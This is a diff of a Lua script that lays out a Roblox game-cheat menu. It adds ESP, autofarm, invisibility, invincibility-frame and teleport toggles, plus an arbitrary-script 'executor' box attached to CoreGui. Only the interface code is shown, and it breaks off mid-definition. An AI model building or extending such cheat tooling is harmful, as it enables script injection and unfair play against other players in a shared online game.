@@ -19,12 +19,14 @@ local Tab1_2 = Instance.new("Frame")
 local _15SecondTS = Instance.new("TextLabel")
 local _15SecondTSButton = Instance.new("ImageButton")
 local TextLabel = Instance.new("TextLabel")
-local AntiTS = Instance.new("TextLabel")
-local AntiTSButton = Instance.new("ImageButton")
+local Keybind = Instance.new("TextBox")
+local TextLabel_2 = Instance.new("TextLabel")
+local AntiTE = Instance.new("TextLabel")
+local AntiTEButton = Instance.new("ImageButton")
 local BlockGlitch = Instance.new("TextLabel")
 local BlockGlitch_2 = Instance.new("ImageButton")
 local Executor_2 = Instance.new("Frame")
-local TextLabel_2 = Instance.new("TextLabel")
+local TextLabel_3 = Instance.new("TextLabel")
 local TextBox = Instance.new("TextBox")
 local Execute = Instance.new("TextButton")
 local Clear = Instance.new("TextButton")
@@ -35,35 +37,63 @@ local TextBox_2 = Instance.new("TextBox")
 local Tab2_2 = Instance.new("Frame")
 local STWRTZ = Instance.new("TextLabel")
 local STWRTZButton = Instance.new("ImageButton")
-local TextLabel_3 = Instance.new("TextLabel")
+local TextLabel_4 = Instance.new("TextLabel")
 local GERRTZ = Instance.new("TextLabel")
 local STWRTZButton_2 = Instance.new("ImageButton")
 local D4CClones = Instance.new("TextLabel")
 local D4CClonesButton = Instance.new("ImageButton")
 local Tab6_2 = Instance.new("Frame")
-local ESplash = Instance.new("TextLabel")
-local ESplashButton = Instance.new("ImageButton")
-local TextLabel_4 = Instance.new("TextLabel")
-local Tab7_2 = Instance.new("Frame")
-local ESplash_2 = Instance.new("TextLabel")
-local ESplashButton_2 = Instance.new("ImageButton")
+local InvisStand = Instance.new("TextLabel")
+local InvisStandButton = Instance.new("ImageButton")
 local TextLabel_5 = Instance.new("TextLabel")
+local Autofarm = Instance.new("TextLabel")
+local AutofarmButton = Instance.new("ImageButton")
+local TextLabel_6 = Instance.new("TextLabel")
+local Stand = Instance.new("TextBox")
+local HealthBars = Instance.new("TextLabel")
+local HealthBarsButton = Instance.new("ImageButton")
+local Tab7_2 = Instance.new("Frame")
+local TextLabel_7 = Instance.new("TextLabel")
+local TPButtonBasePlate = Instance.new("TextButton")
+local TPButtonWaterfall = Instance.new("TextButton")
+local TPButtonArenaLeft = Instance.new("TextButton")
+local TPButtonStandChangerNpc = Instance.new("TextButton")
+local TPButtonFarmZone = Instance.new("TextButton")
+local TPButtonLoadingScreen = Instance.new("TextButton")
+local TPButtonArenaRight = Instance.new("TextButton")
+local TPButtonBossEntrance = Instance.new("TextButton")
+local TPButtonMiddle = Instance.new("TextButton")
+local TPButtonZeldaMoon = Instance.new("TextButton")
+local TPButtonRachaelHouse = Instance.new("TextButton")
+local TPButtonD4C = Instance.new("TextButton")
 local Tab4_2 = Instance.new("Frame")
 local VTWKnife = Instance.new("TextLabel")
 local VTWKnifeButton = Instance.new("ImageButton")
-local TextLabel_6 = Instance.new("TextLabel")
+local TextLabel_8 = Instance.new("TextLabel")
+local Keybind_2 = Instance.new("TextBox")
+local TextLabel_9 = Instance.new("TextLabel")
+local OniIFrames = Instance.new("TextLabel")
+local OniIFramesButton = Instance.new("ImageButton")
+local EpiWarning = Instance.new("TextLabel")
+local EpiWarningButton = Instance.new("ImageButton")
 local Tab3_2 = Instance.new("Frame")
-local ESplash_3 = Instance.new("TextLabel")
-local ESplashButton_3 = Instance.new("ImageButton")
-local TextLabel_7 = Instance.new("TextLabel")
+local ESplash = Instance.new("TextLabel")
+local ESplashButton = Instance.new("ImageButton")
+local TextLabel_10 = Instance.new("TextLabel")
+local Keybind_3 = Instance.new("TextBox")
+local TextLabel_11 = Instance.new("TextLabel")
 local SpamSounds = Instance.new("TextLabel")
 local SpamSoundsButton = Instance.new("ImageButton")
 local TSMovement = Instance.new("TextLabel")
-local SpamSoundsButton_2 = Instance.new("ImageButton")
+local TSMovementButton = Instance.new("ImageButton")
 local Tab5_2 = Instance.new("Frame")
-local ESplash_4 = Instance.new("TextLabel")
-local ESplashButton_4 = Instance.new("ImageButton")
-local TextLabel_8 = Instance.new("TextLabel")
+local SpinDash = Instance.new("TextLabel")
+local SpinDashButton = Instance.new("ImageButton")
+local TextLabel_12 = Instance.new("TextLabel")
+local StandlessCounter = Instance.new("TextLabel")
+local StandlessCounterButton = Instance.new("ImageButton")
+local VTW1TapsBar = Instance.new("TextLabel")
+local VTW1TapsButton = Instance.new("ImageButton")
 local Settings = Instance.new("Frame")
 local ScrollingFrame = Instance.new("ScrollingFrame")
 local ReduceLag = Instance.new("TextButton")
@@ -87,11 +117,21 @@ local Title = Instance.new("TextLabel")
 local Home_2 = Instance.new("ImageButton")
 local Clock = Instance.new("TextLabel")
 local ProfilePicture = Instance.new("ImageLabel")
+local SidebarMusic = Instance.new("Frame")
+local ScrollingFrame_3 = Instance.new("ScrollingFrame")
+local Lofi = Instance.new("TextButton")
+local Music = Instance.new("ImageButton")
 local FullView = Instance.new("TextButton")
+local SFX = Instance.new("Folder")
+local Music_2 = Instance.new("Folder")
+local Rock = Instance.new("Folder")
+local Lofi_2 = Instance.new("Folder")
+local Retro = Instance.new("Folder")
+local UI = Instance.new("Folder")
 
 --Properties:
 
-ScreenGui.Parent = game:WaitForChild("CoreGui")
+ScreenGui.Parent = game.CoreGui
 ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
 ScreenGui.ResetOnSpawn = false
 
@@ -252,42 +292,69 @@ _15SecondTSButton.Position = UDim2.new(1.04999995, 0, 0.180000007, 0)
 _15SecondTSButton.Size = UDim2.new(0, 20, 0, 32)
 _15SecondTSButton.Image = "http://www.roblox.com/asset/?id=107075188558816"
 
-TextLabel.Parent = Tab1_2
+TextLabel.Parent = _15SecondTS
 TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel.BackgroundTransparency = 1.000
 TextLabel.BorderColor3 = Color3.fromRGB(0, 0, 0)
-TextLabel.BorderSizePixel = 5
-TextLabel.Size = UDim2.new(0, 412, 0, 22)
-TextLabel.Font = Enum.Font.Unknown
-TextLabel.Text = "TAB 1"
+TextLabel.BorderSizePixel = 0
+TextLabel.Position = UDim2.new(1, 0, 0, 0)
+TextLabel.Size = UDim2.new(0, 200, 0, 28)
+TextLabel.Font = Enum.Font.ArialBold
+TextLabel.Text = "Bind A Key"
 TextLabel.TextColor3 = Color3.fromRGB(0, 0, 0)
-TextLabel.TextScaled = true
-TextLabel.TextSize = 14.000
+TextLabel.TextSize = 25.000
 TextLabel.TextWrapped = true
 
-AntiTS.Name = "AntiTS"
-AntiTS.Parent = Tab1_2
-AntiTS.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-AntiTS.BackgroundTransparency = 1.000
-AntiTS.BorderColor3 = Color3.fromRGB(0, 0, 0)
-AntiTS.BorderSizePixel = 0
-AntiTS.Position = UDim2.new(0.0825242698, 0, 0.40625, 0)
-AntiTS.Size = UDim2.new(0, 200, 0, 50)
-AntiTS.Font = Enum.Font.ArialBold
-AntiTS.Text = "Anti Timestop"
-AntiTS.TextColor3 = Color3.fromRGB(0, 0, 0)
-AntiTS.TextScaled = true
-AntiTS.TextSize = 14.000
-AntiTS.TextWrapped = true
+Keybind.Name = "Keybind"
+Keybind.Parent = TextLabel
+Keybind.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Keybind.BorderColor3 = Color3.fromRGB(0, 0, 0)
+Keybind.BorderSizePixel = 5
+Keybind.Position = UDim2.new(0.305000007, 0, 0.969522178, 0)
+Keybind.Size = UDim2.new(0, 70, 0, 30)
+Keybind.Font = Enum.Font.SourceSans
+Keybind.Text = ""
+Keybind.TextColor3 = Color3.fromRGB(0, 0, 0)
+Keybind.TextScaled = true
+Keybind.TextSize = 14.000
+Keybind.TextWrapped = true
 
-AntiTSButton.Name = "AntiTSButton"
-AntiTSButton.Parent = AntiTS
-AntiTSButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-AntiTSButton.BackgroundTransparency = 1.000
-AntiTSButton.BorderColor3 = Color3.fromRGB(0, 0, 0)
-AntiTSButton.BorderSizePixel = 0
-AntiTSButton.Position = UDim2.new(1.04999995, 0, 0.180000007, 0)
-AntiTSButton.Size = UDim2.new(0, 20, 0, 32)
-AntiTSButton.Image = "http://www.roblox.com/asset/?id=107075188558816"
+TextLabel_2.Parent = Tab1_2
+TextLabel_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel_2.BorderColor3 = Color3.fromRGB(0, 0, 0)
+TextLabel_2.BorderSizePixel = 5
+TextLabel_2.Size = UDim2.new(0, 412, 0, 22)
+TextLabel_2.Font = Enum.Font.Unknown
+TextLabel_2.Text = "TAB 1"
+TextLabel_2.TextColor3 = Color3.fromRGB(0, 0, 0)
+TextLabel_2.TextScaled = true
+TextLabel_2.TextSize = 14.000
+TextLabel_2.TextWrapped = true
+
+AntiTE.Name = "AntiTE"
+AntiTE.Parent = Tab1_2
+AntiTE.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+AntiTE.BackgroundTransparency = 1.000
+AntiTE.BorderColor3 = Color3.fromRGB(0, 0, 0)
+AntiTE.BorderSizePixel = 0
+AntiTE.Position = UDim2.new(0.0825242698, 0, 0.40625, 0)
+AntiTE.Size = UDim2.new(0, 200, 0, 50)
+AntiTE.Font = Enum.Font.ArialBold
+AntiTE.Text = "Time Erase ESP"
+AntiTE.TextColor3 = Color3.fromRGB(0, 0, 0)
+AntiTE.TextScaled = true
+AntiTE.TextSize = 14.000
+AntiTE.TextWrapped = true
+
+AntiTEButton.Name = "AntiTEButton"
+AntiTEButton.Parent = AntiTE
+AntiTEButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+AntiTEButton.BackgroundTransparency = 1.000
+AntiTEButton.BorderColor3 = Color3.fromRGB(0, 0, 0)
+AntiTEButton.BorderSizePixel = 0
+AntiTEButton.Position = UDim2.new(1.04999995, 0, 0.180000007, 0)
+AntiTEButton.Size = UDim2.new(0, 20, 0, 32)
+AntiTEButton.Image = "http://www.roblox.com/asset/?id=107075188558816"
 
 BlockGlitch.Name = "BlockGlitch"
 BlockGlitch.Parent = Tab1_2
@@ -324,17 +391,17 @@ Executor_2.Position = UDim2.new(0.201550394, 0, -0.00448430516, 0)
 Executor_2.Size = UDim2.new(0, 412, 0, 224)
 Executor_2.Visible = false
 
-TextLabel_2.Parent = Executor_2
-TextLabel_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-TextLabel_2.BorderColor3 = Color3.fromRGB(0, 0, 0)
-TextLabel_2.BorderSizePixel = 5
-TextLabel_2.Size = UDim2.new(0, 412, 0, 22)
-TextLabel_2.Font = Enum.Font.Unknown
-TextLabel_2.Text = "AWAKENED EXECUTOR"
-TextLabel_2.TextColor3 = Color3.fromRGB(0, 0, 0)
-TextLabel_2.TextScaled = true
-TextLabel_2.TextSize = 14.000
-TextLabel_2.TextWrapped = true
+TextLabel_3.Parent = Executor_2
+TextLabel_3.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel_3.BorderColor3 = Color3.fromRGB(0, 0, 0)
+TextLabel_3.BorderSizePixel = 5
+TextLabel_3.Size = UDim2.new(0, 412, 0, 22)
+TextLabel_3.Font = Enum.Font.Unknown
+TextLabel_3.Text = "AWAKENED EXECUTOR"
+TextLabel_3.TextColor3 = Color3.fromRGB(0, 0, 0)
+TextLabel_3.TextScaled = true
+TextLabel_3.TextSize = 14.000
+TextLabel_3.TextWrapped = true
 
 TextBox.Parent = Executor_2
 TextBox.BackgroundColor3 = Color3.fromRGB(63, 63, 63)
@@ -343,6 +410,7 @@ TextBox.BorderSizePixel = 0
 TextBox.Position = UDim2.new(0, 0, 0.0982142836, 0)
 TextBox.Size = UDim2.new(0, 412, 0, 140)
 TextBox.Font = Enum.Font.SourceSans
+TextBox.MultiLine = true
 TextBox.Text = "--WRITE YOUR SCRIPT"
 TextBox.TextColor3 = Color3.fromRGB(255, 255, 255)
 TextBox.TextSize = 14.000
@@ -382,7 +450,6 @@ Home.BorderColor3 = Color3.fromRGB(0, 0, 0)
 Home.BorderSizePixel = 0
 Home.Position = UDim2.new(0.187984496, 0, 0, 0)
 Home.Size = UDim2.new(0, 419, 0, 224)
-Home.Visible = false
 
 Welcome.Name = "Welcome"
 Welcome.Parent = Home
@@ -465,17 +532,17 @@ STWRTZButton.Position = UDim2.new(1.04999995, 0, 0.180000007, 0)
 STWRTZButton.Size = UDim2.new(0, 20, 0, 32)
 STWRTZButton.Image = "http://www.roblox.com/asset/?id=107075188558816"
 
-TextLabel_3.Parent = Tab2_2
-TextLabel_3.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-TextLabel_3.BorderColor3 = Color3.fromRGB(0, 0, 0)
-TextLabel_3.BorderSizePixel = 5
-TextLabel_3.Size = UDim2.new(0, 412, 0, 22)
-TextLabel_3.Font = Enum.Font.Unknown
-TextLabel_3.Text = "TAB 2"
-TextLabel_3.TextColor3 = Color3.fromRGB(0, 0, 0)
-TextLabel_3.TextScaled = true
-TextLabel_3.TextSize = 14.000
-TextLabel_3.TextWrapped = true
+TextLabel_4.Parent = Tab2_2
+TextLabel_4.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel_4.BorderColor3 = Color3.fromRGB(0, 0, 0)
+TextLabel_4.BorderSizePixel = 5
+TextLabel_4.Size = UDim2.new(0, 412, 0, 22)
+TextLabel_4.Font = Enum.Font.Unknown
+TextLabel_4.Text = "TAB 2"
+TextLabel_4.TextColor3 = Color3.fromRGB(0, 0, 0)
+TextLabel_4.TextScaled = true
+TextLabel_4.TextSize = 14.000
+TextLabel_4.TextWrapped = true
 
 GERRTZ.Name = "GERRTZ"
 GERRTZ.Parent = Tab2_2
@@ -537,42 +604,121 @@ Tab6_2.Position = UDim2.new(0.201550394, 0, -0.00448430516, 0)
 Tab6_2.Size = UDim2.new(0, 412, 0, 224)
 Tab6_2.Visible = false
 
-ESplash.Name = "ESplash"
-ESplash.Parent = Tab6_2
-ESplash.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-ESplash.BackgroundTransparency = 1.000
-ESplash.BorderColor3 = Color3.fromRGB(0, 0, 0)
-ESplash.BorderSizePixel = 0
-ESplash.Position = UDim2.new(0.0825242698, 0, 0.129464284, 0)
-ESplash.Size = UDim2.new(0, 200, 0, 50)
-ESplash.Font = Enum.Font.ArialBold
-ESplash.Text = "Emerald Splash"
-ESplash.TextColor3 = Color3.fromRGB(0, 0, 0)
-ESplash.TextScaled = true
-ESplash.TextSize = 14.000
-ESplash.TextWrapped = true
+InvisStand.Name = "InvisStand"
+InvisStand.Parent = Tab6_2
+InvisStand.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+InvisStand.BackgroundTransparency = 1.000
+InvisStand.BorderColor3 = Color3.fromRGB(0, 0, 0)
+InvisStand.BorderSizePixel = 0
+InvisStand.Position = UDim2.new(0.0825242698, 0, 0.129464284, 0)
+InvisStand.Size = UDim2.new(0, 200, 0, 50)
+InvisStand.Font = Enum.Font.ArialBold
+InvisStand.Text = "Invisible Stand"
+InvisStand.TextColor3 = Color3.fromRGB(0, 0, 0)
+InvisStand.TextScaled = true
+InvisStand.TextSize = 14.000
+InvisStand.TextWrapped = true
 
-ESplashButton.Name = "ESplashButton"
-ESplashButton.Parent = ESplash
-ESplashButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-ESplashButton.BackgroundTransparency = 1.000
-ESplashButton.BorderColor3 = Color3.fromRGB(0, 0, 0)
-ESplashButton.BorderSizePixel = 0
-ESplashButton.Position = UDim2.new(1.04999995, 0, 0.180000007, 0)
-ESplashButton.Size = UDim2.new(0, 20, 0, 32)
-ESplashButton.Image = "http://www.roblox.com/asset/?id=107075188558816"
+InvisStandButton.Name = "InvisStandButton"
+InvisStandButton.Parent = InvisStand
+InvisStandButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+InvisStandButton.BackgroundTransparency = 1.000
+InvisStandButton.BorderColor3 = Color3.fromRGB(0, 0, 0)
+InvisStandButton.BorderSizePixel = 0
+InvisStandButton.Position = UDim2.new(1.04999995, 0, 0.180000007, 0)
+InvisStandButton.Size = UDim2.new(0, 20, 0, 32)
+InvisStandButton.Image = "http://www.roblox.com/asset/?id=107075188558816"
 
-TextLabel_4.Parent = Tab6_2
-TextLabel_4.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-TextLabel_4.BorderColor3 = Color3.fromRGB(0, 0, 0)
-TextLabel_4.BorderSizePixel = 5
-TextLabel_4.Size = UDim2.new(0, 412, 0, 22)
-TextLabel_4.Font = Enum.Font.Unknown
-TextLabel_4.Text = "TAB 1"
-TextLabel_4.TextColor3 = Color3.fromRGB(0, 0, 0)
-TextLabel_4.TextScaled = true
-TextLabel_4.TextSize = 14.000
-TextLabel_4.TextWrapped = true
+TextLabel_5.Parent = Tab6_2
+TextLabel_5.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel_5.BorderColor3 = Color3.fromRGB(0, 0, 0)
+TextLabel_5.BorderSizePixel = 5
+TextLabel_5.Size = UDim2.new(0, 412, 0, 22)
+TextLabel_5.Font = Enum.Font.Unknown
+TextLabel_5.Text = "TAB 6"
+TextLabel_5.TextColor3 = Color3.fromRGB(0, 0, 0)
+TextLabel_5.TextScaled = true
+TextLabel_5.TextSize = 14.000
+TextLabel_5.TextWrapped = true
+
+Autofarm.Name = "Autofarm"
+Autofarm.Parent = Tab6_2
+Autofarm.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Autofarm.BackgroundTransparency = 1.000
+Autofarm.BorderColor3 = Color3.fromRGB(0, 0, 0)
+Autofarm.BorderSizePixel = 0
+Autofarm.Position = UDim2.new(0.0825242698, 0, 0.705357134, 0)
+Autofarm.Size = UDim2.new(0, 200, 0, 50)
+Autofarm.Font = Enum.Font.ArialBold
+Autofarm.Text = "Autofarm"
+Autofarm.TextColor3 = Color3.fromRGB(0, 0, 0)
+Autofarm.TextScaled = true
+Autofarm.TextSize = 14.000
+Autofarm.TextWrapped = true
+
+AutofarmButton.Name = "AutofarmButton"
+AutofarmButton.Parent = Autofarm
+AutofarmButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+AutofarmButton.BackgroundTransparency = 1.000
+AutofarmButton.BorderColor3 = Color3.fromRGB(0, 0, 0)
+AutofarmButton.BorderSizePixel = 0
+AutofarmButton.Position = UDim2.new(1.04999995, 0, 0.180000007, 0)
+AutofarmButton.Size = UDim2.new(0, 20, 0, 32)
+AutofarmButton.Image = "http://www.roblox.com/asset/?id=107075188558816"
+
+TextLabel_6.Parent = Autofarm
+TextLabel_6.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel_6.BackgroundTransparency = 1.000
+TextLabel_6.BorderColor3 = Color3.fromRGB(0, 0, 0)
+TextLabel_6.BorderSizePixel = 0
+TextLabel_6.Position = UDim2.new(1.16499996, 0, -0.140000001, 0)
+TextLabel_6.Size = UDim2.new(0, 150, 0, 46)
+TextLabel_6.Font = Enum.Font.ArialBold
+TextLabel_6.Text = "Autofarm Stand (Example: TW, SP)"
+TextLabel_6.TextColor3 = Color3.fromRGB(0, 0, 0)
+TextLabel_6.TextScaled = true
+TextLabel_6.TextSize = 1.000
+TextLabel_6.TextWrapped = true
+TextLabel_6.TextYAlignment = Enum.TextYAlignment.Top
+
+Stand.Name = "Stand"
+Stand.Parent = TextLabel_6
+Stand.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Stand.BorderColor3 = Color3.fromRGB(0, 0, 0)
+Stand.BorderSizePixel = 5
+Stand.Position = UDim2.new(0.305000007, 0, 0.969522178, 0)
+Stand.Size = UDim2.new(0, 70, 0, 30)
+Stand.Font = Enum.Font.SourceSans
+Stand.Text = ""
+Stand.TextColor3 = Color3.fromRGB(0, 0, 0)
+Stand.TextScaled = true
+Stand.TextSize = 14.000
+Stand.TextWrapped = true
+
+HealthBars.Name = "HealthBars"
+HealthBars.Parent = Tab6_2
+HealthBars.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+HealthBars.BackgroundTransparency = 1.000
+HealthBars.BorderColor3 = Color3.fromRGB(0, 0, 0)
+HealthBars.BorderSizePixel = 0
+HealthBars.Position = UDim2.new(0.0825242698, 0, 0.40625, 0)
+HealthBars.Size = UDim2.new(0, 200, 0, 50)
+HealthBars.Font = Enum.Font.ArialBold
+HealthBars.Text = "Health Bars"
+HealthBars.TextColor3 = Color3.fromRGB(0, 0, 0)
+HealthBars.TextScaled = true
+HealthBars.TextSize = 14.000
+HealthBars.TextWrapped = true
+
+HealthBarsButton.Name = "HealthBarsButton"
+HealthBarsButton.Parent = HealthBars
+HealthBarsButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+HealthBarsButton.BackgroundTransparency = 1.000
+HealthBarsButton.BorderColor3 = Color3.fromRGB(0, 0, 0)
+HealthBarsButton.BorderSizePixel = 0
+HealthBarsButton.Position = UDim2.new(1.04999995, 0, 0.180000007, 0)
+HealthBarsButton.Size = UDim2.new(0, 20, 0, 32)
+HealthBarsButton.Image = "http://www.roblox.com/asset/?id=107075188558816"
 
 Tab7_2.Name = "Tab7"
 Tab7_2.Parent = Tabs
@@ -584,42 +730,185 @@ Tab7_2.Position = UDim2.new(0.201550394, 0, -0.00448430516, 0)
 Tab7_2.Size = UDim2.new(0, 412, 0, 224)
 Tab7_2.Visible = false
 
-ESplash_2.Name = "ESplash"
-ESplash_2.Parent = Tab7_2
-ESplash_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-ESplash_2.BackgroundTransparency = 1.000
-ESplash_2.BorderColor3 = Color3.fromRGB(0, 0, 0)
-ESplash_2.BorderSizePixel = 0
-ESplash_2.Position = UDim2.new(0.0825242698, 0, 0.129464284, 0)
-ESplash_2.Size = UDim2.new(0, 200, 0, 50)
-ESplash_2.Font = Enum.Font.ArialBold
-ESplash_2.Text = "Emerald Splash"
-ESplash_2.TextColor3 = Color3.fromRGB(0, 0, 0)
-ESplash_2.TextScaled = true
-ESplash_2.TextSize = 14.000
-ESplash_2.TextWrapped = true
+TextLabel_7.Parent = Tab7_2
+TextLabel_7.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel_7.BorderColor3 = Color3.fromRGB(0, 0, 0)
+TextLabel_7.BorderSizePixel = 5
+TextLabel_7.Size = UDim2.new(0, 412, 0, 22)
+TextLabel_7.Font = Enum.Font.Unknown
+TextLabel_7.Text = "TAB 7"
+TextLabel_7.TextColor3 = Color3.fromRGB(0, 0, 0)
+TextLabel_7.TextScaled = true
+TextLabel_7.TextSize = 14.000
+TextLabel_7.TextWrapped = true
 
-ESplashButton_2.Name = "ESplashButton"
-ESplashButton_2.Parent = ESplash_2
-ESplashButton_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-ESplashButton_2.BackgroundTransparency = 1.000
-ESplashButton_2.BorderColor3 = Color3.fromRGB(0, 0, 0)
-ESplashButton_2.BorderSizePixel = 0
-ESplashButton_2.Position = UDim2.new(1.04999995, 0, 0.180000007, 0)
-ESplashButton_2.Size = UDim2.new(0, 20, 0, 32)
-ESplashButton_2.Image = "http://www.roblox.com/asset/?id=107075188558816"
+TPButtonBasePlate.Name = "TPButtonBasePlate"
+TPButtonBasePlate.Parent = Tab7_2
+TPButtonBasePlate.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+TPButtonBasePlate.BorderColor3 = Color3.fromRGB(255, 255, 255)
+TPButtonBasePlate.BorderSizePixel = 2
+TPButtonBasePlate.Position = UDim2.new(0.0267088059, 0, 0.608035684, 0)
+TPButtonBasePlate.Size = UDim2.new(0, 75, 0, 36)
+TPButtonBasePlate.Font = Enum.Font.SourceSans
+TPButtonBasePlate.Text = "Baseplate"
+TPButtonBasePlate.TextColor3 = Color3.fromRGB(0, 0, 0)
+TPButtonBasePlate.TextSize = 14.000
+TPButtonBasePlate.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)
+TPButtonBasePlate.TextStrokeTransparency = 0.000
 
-TextLabel_5.Parent = Tab7_2
-TextLabel_5.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-TextLabel_5.BorderColor3 = Color3.fromRGB(0, 0, 0)
-TextLabel_5.BorderSizePixel = 5
-TextLabel_5.Size = UDim2.new(0, 412, 0, 22)
-TextLabel_5.Font = Enum.Font.Unknown
-TextLabel_5.Text = "TAB 1"
-TextLabel_5.TextColor3 = Color3.fromRGB(0, 0, 0)
-TextLabel_5.TextScaled = true
-TextLabel_5.TextSize = 14.000
-TextLabel_5.TextWrapped = true
+TPButtonWaterfall.Name = "TPButtonWaterfall"
+TPButtonWaterfall.Parent = Tab7_2
+TPButtonWaterfall.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+TPButtonWaterfall.BorderColor3 = Color3.fromRGB(255, 255, 255)
+TPButtonWaterfall.BorderSizePixel = 2
+TPButtonWaterfall.Position = UDim2.new(0.0267088059, 0, 0.800000012, 0)
+TPButtonWaterfall.Size = UDim2.new(0, 75, 0, 36)
+TPButtonWaterfall.Font = Enum.Font.SourceSans
+TPButtonWaterfall.Text = "Waterfall"
+TPButtonWaterfall.TextColor3 = Color3.fromRGB(0, 0, 0)
+TPButtonWaterfall.TextSize = 14.000
+TPButtonWaterfall.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)
+TPButtonWaterfall.TextStrokeTransparency = 0.000
+
+TPButtonArenaLeft.Name = "TPButtonArenaLeft"
+TPButtonArenaLeft.Parent = Tab7_2
+TPButtonArenaLeft.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+TPButtonArenaLeft.BorderColor3 = Color3.fromRGB(255, 255, 255)
+TPButtonArenaLeft.BorderSizePixel = 2
+TPButtonArenaLeft.Position = UDim2.new(0.0267088059, 0, 0.233500004, 0)
+TPButtonArenaLeft.Size = UDim2.new(0, 75, 0, 36)
+TPButtonArenaLeft.Font = Enum.Font.SourceSans
+TPButtonArenaLeft.Text = "Arena Left"
+TPButtonArenaLeft.TextColor3 = Color3.fromRGB(0, 0, 0)
+TPButtonArenaLeft.TextSize = 14.000
+TPButtonArenaLeft.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)
+TPButtonArenaLeft.TextStrokeTransparency = 0.000
+
+TPButtonStandChangerNpc.Name = "TPButtonStandChangerNpc"
+TPButtonStandChangerNpc.Parent = Tab7_2
+TPButtonStandChangerNpc.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+TPButtonStandChangerNpc.BorderColor3 = Color3.fromRGB(255, 255, 255)
+TPButtonStandChangerNpc.BorderSizePixel = 2
+TPButtonStandChangerNpc.Position = UDim2.new(0.0267088059, 0, 0.421535701, 0)
+TPButtonStandChangerNpc.Size = UDim2.new(0, 75, 0, 36)
+TPButtonStandChangerNpc.Font = Enum.Font.SourceSans
+TPButtonStandChangerNpc.Text = "Timmy"
+TPButtonStandChangerNpc.TextColor3 = Color3.fromRGB(0, 0, 0)
+TPButtonStandChangerNpc.TextSize = 14.000
+TPButtonStandChangerNpc.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)
+TPButtonStandChangerNpc.TextStrokeTransparency = 0.000
+
+TPButtonFarmZone.Name = "TPButtonFarmZone"
+TPButtonFarmZone.Parent = Tab7_2
+TPButtonFarmZone.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+TPButtonFarmZone.BorderColor3 = Color3.fromRGB(255, 255, 255)
+TPButtonFarmZone.BorderSizePixel = 2
+TPButtonFarmZone.Position = UDim2.new(0.39564085, 0, 0.608035684, 0)
+TPButtonFarmZone.Size = UDim2.new(0, 75, 0, 36)
+TPButtonFarmZone.Font = Enum.Font.SourceSans
+TPButtonFarmZone.Text = "Farm Zone"
+TPButtonFarmZone.TextColor3 = Color3.fromRGB(0, 0, 0)
+TPButtonFarmZone.TextSize = 14.000
+TPButtonFarmZone.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)
+TPButtonFarmZone.TextStrokeTransparency = 0.000
+
+TPButtonLoadingScreen.Name = "TPButtonLoadingScreen"
+TPButtonLoadingScreen.Parent = Tab7_2
+TPButtonLoadingScreen.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+TPButtonLoadingScreen.BorderColor3 = Color3.fromRGB(255, 255, 255)
+TPButtonLoadingScreen.BorderSizePixel = 2
+TPButtonLoadingScreen.Position = UDim2.new(0.39564085, 0, 0.421535701, 0)
+TPButtonLoadingScreen.Size = UDim2.new(0, 75, 0, 36)
+TPButtonLoadingScreen.Font = Enum.Font.SourceSans
+TPButtonLoadingScreen.Text = "Loading Screen"
+TPButtonLoadingScreen.TextColor3 = Color3.fromRGB(0, 0, 0)
+TPButtonLoadingScreen.TextSize = 14.000
+TPButtonLoadingScreen.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)
+TPButtonLoadingScreen.TextStrokeTransparency = 0.000
+
+TPButtonArenaRight.Name = "TPButtonArenaRight"
+TPButtonArenaRight.Parent = Tab7_2
+TPButtonArenaRight.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+TPButtonArenaRight.BorderColor3 = Color3.fromRGB(255, 255, 255)
+TPButtonArenaRight.BorderSizePixel = 2
+TPButtonArenaRight.Position = UDim2.new(0.39564085, 0, 0.233500004, 0)
+TPButtonArenaRight.Size = UDim2.new(0, 75, 0, 36)
+TPButtonArenaRight.Font = Enum.Font.SourceSans
+TPButtonArenaRight.Text = "Arena Right"
+TPButtonArenaRight.TextColor3 = Color3.fromRGB(0, 0, 0)
+TPButtonArenaRight.TextSize = 14.000
+TPButtonArenaRight.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)
+TPButtonArenaRight.TextStrokeTransparency = 0.000
+
+TPButtonBossEntrance.Name = "TPButtonBossEntrance"
+TPButtonBossEntrance.Parent = Tab7_2
